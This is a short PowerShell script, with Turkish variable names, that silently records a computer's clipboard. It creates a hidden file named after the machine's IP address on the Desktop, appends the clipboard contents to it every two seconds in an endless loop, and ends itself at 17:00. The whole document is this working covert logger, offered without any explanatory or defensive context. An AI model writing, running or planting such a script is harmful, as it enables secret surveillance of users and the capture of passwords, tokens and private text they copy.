$ip=(Test-Connection -ComputerName $env:computername -count 1).IPV4Address.ipaddressTOstring 

$dosyaAdi="$ip-clipboard.txt";

cd 	"~\Desktop";


if(!(Test-Path $dosyaAdi))
{
    ni $dosyaAdi  -Type file
   $gizle=get-item $dosyaAdi -Force
   $gizle.attributes="Hidden"
}
while($true)
{
    Start-Sleep 2;
    Get-Clipboard >> $dosyaAdi;

    if("17:00" -eq (Get-Date -UFormat %R))
    {
        Stop-Process -Id $PID;
    }
}


